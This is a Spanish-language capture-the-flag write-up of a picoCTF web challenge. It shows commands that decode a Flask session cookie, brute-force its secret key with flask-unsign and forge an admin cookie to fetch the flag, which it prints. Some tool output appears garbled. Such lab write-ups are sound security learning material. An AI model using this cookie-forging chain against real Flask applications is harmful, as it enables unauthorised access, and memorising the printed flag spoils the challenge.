#notas_hacking #web
# Reto
## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/1e4bd835ad3e7fe776d49e7b8cc280c1/server.py) [http://mercury.picoctf.net:35697/](http://mercury.picoctf.net:35697/)
## Solución

Decodificamos la `cookie`
```bash
┌──(kali㉿kali)-[~/pico]
└─$ echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aNs9-g.72zM3Zz84kFNiNGB-8rfK3johd4 | base64 -d
{"very_auth":"snickerdoodle"}base64: invalid input
```
Extraemos de `server.py` las cookies y las guardamos en un archivo `cookies.txt` con el editor `pluma`, y en un ambiente virtual descargamos la herramienta que con fuerza bruta extraerá la llave
```bash
┌──(kali㉿kali)-[~/pico]
└─$ pluma server.py
┌──(kali㉿kali)-[~/pico]
└─$ python3 -m venv ~/.venv
┌──(kali㉿kali)-[~/pico]
└─$ source ~/.venv/bin/activate
┌──(.venv)─(kali㉿kali)-[~/pico]
└─$ python3 -m pip install flask-unsign
┌──(.venv)─(kali㉿kali)-[~/pico]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aNs9-g.72zM3Zz84kFNiNGB-8rfK3johd4" --wordlist cookies.txt 
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
```
creamos la `cookie`
```bash
┌──(.venv)─(kali㉿kali)-[~/pico]
└─$ flask-unsign --sign --cookie "{"very_auth":"admin"}" --secret "peanut butter"
Int2ZXJ5X2F1dGg6c25pY2tlcmRvb2RsZX0i.aNtDDQ.-YzUD_mzQi4GtPSXcjEgBJatr3k
──(.venv)─(kali㉿kali)-[~/pico]
└─$ curl -s http://mercury.picoctf.net:35697/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNtGZg.14yV1AMPyBWTx5Ys9yACYgcEp78" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_22fe0842}</code></p>
```
## Notas

## Referencias
https://github.com/Paradoxis/Flask-Unsign - herramienta para realizar un ataque de fuerza bruta a la `cookie` para saber la llave con la que se cifro